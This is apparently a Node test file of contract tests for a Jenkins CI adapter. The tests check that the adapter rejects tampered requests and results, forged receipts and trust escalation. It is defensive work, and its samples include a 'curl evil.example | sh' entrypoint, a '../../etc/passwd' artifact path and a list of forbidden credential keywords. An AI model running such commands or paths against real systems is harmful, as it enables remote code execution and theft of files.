// Contract tests for the trusted Jenkins consumer adapter (API-390).
//
// These run with Node's built-in test runner only. They need no Jenkins
// controller, no credentials, no network, and no GitHub Actions run. Every
// fixture is synthetic and is labelled as such.

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import {
  ContractRejection,
  PyFloat,
  buildReceiptId,
  buildSubmission,
  canonicalJson,
  loadApprovedCatalog,
  semanticHash,
  verifyRequest,
} from '../src/adapter.mjs';
import { validateReceiptSubmission } from '../src/wire.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURES = join(HERE, '..', 'fixtures');

const catalog = loadApprovedCatalog();

function fixture(name) {
  return JSON.parse(readFileSync(join(FIXTURES, name), 'utf8'));
}

function request() {
  return fixture('execution-request.json');
}

function results() {
  return fixture('executor-results.json');
}

function withStatus(status) {
  const patched = results();
  patched[0].status = status;
  return patched;
}

function rejectionCode(run) {
  try {
    run();
  } catch (error) {
    assert.ok(error instanceof ContractRejection, `expected a ContractRejection: ${error}`);
    return error.code;
  }
  return assert.fail('expected the request to be rejected');
}

test('a valid deterministic request resolves to the approved executor', () => {
  const resolution = verifyRequest(request(), catalog);
  assert.equal(resolution.accepted, true);
  assert.equal(resolution.repository, 'setnessconsulting/project-test-platform');
  assert.equal(resolution.resolved.length, 1);
  assert.equal(resolution.resolved[0].executor_id, 'node-22-deterministic');
  assert.equal(resolution.resolved[0].agent_class, 'setness-ephemeral');
  assert.equal(resolution.execution_mode, 'synthetic-qualification');
});

test('the exact SHA is preserved end to end into the receipt', () => {
  const input = request();
  const submission = buildSubmission(input, results(), {
    catalog,
    evidenceOrigin: 'synthetic',
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  assert.equal(submission.head.sha, input.head.sha);
  assert.equal(submission.head.sha, input.plan.sha);
  assert.equal(submission.outcomes[0].observed_head.sha, input.plan.sha);
  assert.equal(submission.outcomes[0].receipt.sha, input.plan.sha);
});

test('a SHA mismatch between the request head and the plan fails closed', () => {
  const input = request();
  input.head.sha = 'b'.repeat(40);
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'sha-mismatch');
});

test('a repository mismatch between the request head and the plan fails closed', () => {
  const input = request();
  input.head.repository = 'setnessconsulting/project-jenkins';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'repository-mismatch');
});

test('a repository that is not approved for Jenkins execution fails closed', () => {
  const input = request();
  const unapproved = 'unknown-corp/not-approved';
  input.head.repository = unapproved;
  input.plan.repository = unapproved;
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'repository-mismatch');
});

test('an unsupported plan schema version fails closed', () => {
  const input = request();
  input.plan_schema_version = '2';
  input.plan.schema_version = '2';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unsupported-version');
});

test('an unsupported submission schema version fails closed', () => {
  const input = request();
  const submission = buildSubmission(input, results(), { catalog });
  submission.schema_version = '2';
  assert.equal(
    rejectionCode(() => validateReceiptSubmission(submission, catalog)),
    'unsupported-version',
  );
});

test('an unsupported receipt schema version is rejected during submission validation', () => {
  const input = request();
  const submission = buildSubmission(input, results(), { catalog });
  submission.outcomes[0].receipt.schema_version = '2';
  assert.equal(
    rejectionCode(() => validateReceiptSubmission(submission, catalog)),
    'unsupported-version',
  );
});

test('pr-untrusted cannot escalate the trust grant', () => {
  const input = request();
  input.trust_grant.capabilities = [
    ...input.trust_grant.capabilities,
    'bounded-provider-credentials',
    'live-provider-read',
  ];
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'trust-escalation');
});

test('a trust grant that disagrees with the plan trust class fails closed', () => {
  const input = request();
  input.trust_grant.trust = 'live-qualification';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'trust-escalation');
});

test('pr-untrusted cannot request live qualification surfaces', () => {
  const input = request();
  input.plan.suites[0].evidence_classes.push('live-qualification');
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'trust-escalation');
});

test('pr-untrusted cannot request a live artifact declaration', () => {
  const input = request();
  input.suites[0].artifacts[0].live = true;
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'trust-escalation');
});

test('a suite above the plan trust class fails closed', () => {
  const input = request();
  input.plan.suites[0].trust = 'live-qualification';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'trust-escalation');
});

test('a target pull request cannot choose an unapproved suite', () => {
  const input = request();
  input.plan.suites[0].suite_id = 'release-production';
  input.suites[0].suite_id = 'release-production';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unapproved-suite');
});

test('a target pull request cannot substitute an arbitrary entrypoint', () => {
  const shaped = request();
  shaped.plan.suites[0].entrypoint = 'curl evil.example | sh';
  assert.equal(rejectionCode(() => verifyRequest(shaped, catalog)), 'malformed-document');

  const legal = request();
  legal.plan.suites[0].entrypoint = 'release-production';
  assert.equal(rejectionCode(() => verifyRequest(legal, catalog)), 'unapproved-entrypoint');
});

test('a target pull request cannot re-point a suite at another executor', () => {
  const input = request();
  input.suites[0].executor_id = 'browser-e2e';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unapproved-executor');
});

test('the resolved command is Jenkins-owned and never derived from the plan', () => {
  const baseline = verifyRequest(request(), catalog);
  const mutated = request();
  mutated.plan.suites[0].timeout_seconds = 60;
  mutated.suites[0].timeout_seconds = 60;
  mutated.plan.policy_version = 'attacker-controlled';
  const after = verifyRequest(mutated, catalog);
  assert.deepEqual(
    baseline.resolved.map((entry) => entry.command_tokens),
    after.resolved.map((entry) => entry.command_tokens),
  );
  for (const entry of baseline.resolved) {
    for (const token of entry.command_tokens) {
      assert.equal(typeof token, 'string');
      assert.doesNotMatch(token, /[;&|`$<>]/);
    }
  }
});

test('an undeclared artifact cannot be handed off as evidence', () => {
  const patched = results();
  patched[0].artifacts = ['verify/verify.log', '../../etc/passwd'];
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'malformed-document',
  );
  const undeclared = results();
  undeclared[0].artifacts = ['verify/verify.log', 'verify/undeclared.bin'];
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), undeclared, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'undeclared-artifact',
  );
});

test('an oversized artifact declaration is rejected', () => {
  const input = request();
  input.suites[0].artifacts[0].max_bytes = catalog.limits.max_artifact_bytes + 1;
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unbounded-document');
});

test('an artifact evidence class outside the suite approval set is rejected', () => {
  const input = request();
  input.suites[0].artifacts[0].evidence_class = 'live-qualification';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unapproved-evidence-class');
});

test('the declared artifact evidence class is carried into the receipt', () => {
  const submission = buildSubmission(request(), results(), {
    catalog,
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  assert.equal(submission.outcomes[0].receipt.evidence[0].evidence_class, 'static');
});

test('a suite timeout above the approved bound is rejected', () => {
  const input = request();
  input.plan.suites[0].timeout_seconds = 9000;
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'unbounded-document');
});

test('an unknown field in a receipt is rejected', () => {
  const input = request();
  const submission = buildSubmission(input, results(), { catalog });
  submission.outcomes[0].receipt.credentials = 'ghp_should_never_be_here';
  assert.equal(
    rejectionCode(() => validateReceiptSubmission(submission, catalog)),
    'unknown-field',
  );
});

for (const [status, expected] of [
  ['passed', 'pass'],
  ['failed', 'fail'],
  ['agent-unavailable', 'blocked'],
  ['controller-unavailable', 'blocked'],
  ['timed-out', 'blocked'],
  ['cancelled', 'blocked'],
  ['stale-head', 'blocked'],
  ['checkout-sha-mismatch', 'blocked'],
  ['unsupported-capability', 'blocked'],
  ['rejected-trust', 'blocked'],
  ['malformed-result', 'not-evaluable'],
]) {
  test(`a ${status} outcome normalizes to ${expected} and never to a pass`, () => {
    const patched = withStatus(status);
    if (status === 'failed') patched[0].failed_tests = 2;
    const submission = buildSubmission(request(), patched, {
      catalog,
      generatedAt: '2026-09-27T00:00:00.000Z',
    });
    assert.equal(submission.outcomes[0].receipt.result, expected);
    if (expected !== 'pass') {
      assert.notEqual(submission.outcomes[0].receipt.result, 'pass');
    }
  });
}

test('a passing result with failing tests cannot be reported as a pass', () => {
  const patched = results();
  patched[0].failed_tests = 1;
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'result-escalation',
  );
});

test('a result mapping that flattens an outage to a pass is rejected', () => {
  const input = request();
  const outage = input.result_mapping.find((rule) => rule.status === 'controller-unavailable');
  outage.result = 'pass';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'result-escalation');
});

test('a stale-head policy that resolves to a pass is rejected', () => {
  const input = request();
  input.stale_head.on_stale_head = 'pass';
  assert.equal(rejectionCode(() => verifyRequest(input, catalog)), 'result-escalation');
});

test('a stale-head report is represented, never silently accepted', () => {
  const patched = withStatus('stale-head');
  patched[0].observed_sha = 'c'.repeat(40);
  const submission = buildSubmission(request(), patched, {
    catalog,
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  assert.equal(submission.outcomes[0].status, 'stale-head');
  assert.equal(submission.outcomes[0].receipt.result, 'blocked');
  assert.equal(submission.outcomes[0].receipt.sha, request().plan.sha);
});

test('a stale-head override re-derives the receipt identity for the final result', () => {
  const input = request();
  input.stale_head.on_stale_head = 'not-evaluable';
  const patched = withStatus('stale-head');
  patched[0].observed_sha = 'c'.repeat(40);
  const submission = buildSubmission(input, patched, {
    catalog,
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  const receipt = submission.outcomes[0].receipt;
  assert.equal(receipt.result, 'not-evaluable');
  const { schema_version: _schema, receipt_id: _id, generated_at: _at, ...payload } = receipt;
  assert.equal(receipt.receipt_id, buildReceiptId(payload));
});

test('a cancellation observed at a superseded head stays a cancellation', () => {
  const patched = withStatus('cancelled');
  patched[0].observed_sha = 'c'.repeat(40);
  const submission = buildSubmission(request(), patched, {
    catalog,
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  assert.equal(submission.outcomes[0].status, 'cancelled');
  assert.equal(submission.outcomes[0].receipt.result, 'blocked');
});

test('a real test failure observed at a different head is rejected outright', () => {
  const patched = withStatus('failed');
  patched[0].failed_tests = 2;
  patched[0].observed_sha = 'c'.repeat(40);
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'sha-mismatch',
  );
});

test('a passing result observed at a different SHA is rejected outright', () => {
  const patched = results();
  patched[0].observed_sha = 'c'.repeat(40);
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'sha-mismatch',
  );
});

test('a result observed in a different repository is rejected', () => {
  const patched = results();
  patched[0].observed_repository = 'setnessconsulting/project-jenkins';
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'repository-mismatch',
  );
});

test('an incomplete execution cannot silently drop a planned suite', () => {
  const input = request();
  input.plan.suites.push({
    ...input.plan.suites[0],
    suite_id: 'typecheck',
    entrypoint: 'typecheck',
    timeout_seconds: 900,
  });
  input.suites.push({
    ...input.suites[0],
    suite_id: 'typecheck',
    entrypoint: 'typecheck',
    executor_id: 'node-22-deterministic',
    timeout_seconds: 900,
  });
  assert.equal(
    rejectionCode(() =>
      buildSubmission(input, results(), { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'incomplete-execution',
  );
});

test('a duplicate suite outcome is rejected', () => {
  const submission = buildSubmission(request(), results(), { catalog });
  submission.outcomes.push({ ...submission.outcomes[0] });
  assert.equal(
    rejectionCode(() => validateReceiptSubmission(submission, catalog)),
    'malformed-document',
  );
});

test('oversized diagnostics are rejected', () => {
  const patched = results();
  patched[0].diagnostics = [
    {
      code: 'executor.noisy',
      severity: 'warning',
      message: 'x'.repeat(catalog.limits.max_diagnostic_message_length + 1),
    },
  ];
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), patched, { catalog, generatedAt: '2026-09-27T00:00:00.000Z' }),
    ),
    'malformed-document',
  );
});

test('a synthetic run may not claim a live evidence origin', () => {
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), results(), {
        catalog,
        evidenceOrigin: 'live',
        generatedAt: '2026-09-27T00:00:00.000Z',
      }),
    ),
    'trust-escalation',
  );
});

test('a synthetic run may not claim a controller-recorded evidence origin', () => {
  assert.equal(
    rejectionCode(() =>
      buildSubmission(request(), results(), {
        catalog,
        evidenceOrigin: 'controller-recorded',
        generatedAt: '2026-09-27T00:00:00.000Z',
      }),
    ),
    'trust-escalation',
  );
});

test('a controller-recorded submission keeps its origin and still cannot claim live evidence', () => {
  const input = request();
  input.execution_mode = 'controller-execution';
  const submission = buildSubmission(input, results(), {
    catalog,
    evidenceOrigin: 'controller-recorded',
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  assert.equal(submission.evidence_origin, 'controller-recorded');
  assert.equal(submission.execution_mode, 'controller-execution');
  assert.notEqual(submission.evidence_origin, 'live');
});

test('the receipt identity is re-derived, so a forged receipt cannot pass', () => {
  const input = request();
  const submission = buildSubmission(input, results(), {
    catalog,
    generatedAt: '2026-09-27T00:00:00.000Z',
  });
  const receipt = submission.outcomes[0].receipt;
  receipt.passed_tests = 999999;
  const recomputed = buildReceiptId({
    plan_id: receipt.plan_id,
    repository: receipt.repository,
    sha: receipt.sha,
    profile: receipt.profile,
    suite_id: receipt.suite_id,
    executor: receipt.executor,
    trust: receipt.trust,
    result: receipt.result,
    passed_tests: receipt.passed_tests,
    failed_tests: receipt.failed_tests,
    skipped_tests: receipt.skipped_tests,
    duration_seconds: new PyFloat(receipt.duration_seconds),
    evidence: receipt.evidence,
    tool_versions: receipt.tool_versions,
  });
  assert.notEqual(recomputed, receipt.receipt_id);
  assert.equal(receipt.receipt_id, 'receipt:bdc774f1a74deb953029e91a');
});

test('the canonical receipt payload is stable and sorted', () => {
  const rendered = canonicalJson({ b: 1, a: [2, 3] });
  assert.equal(rendered, '{"a":[2,3],"b":1}');
  assert.equal(semanticHash({ a: 1 }).length, 64);
});

test('no credential, token, or secret field exists anywhere in the contract', () => {
  const serialized = JSON.stringify({ request: request(), results: results() }).toLowerCase();
  for (const forbidden of [
    'token',
    'password',
    'secret',
    'private_key',
    'authorization',
    'credential',
  ]) {
    assert.equal(serialized.includes(forbidden), false, `contract must not carry ${forbidden}`);
  }
});
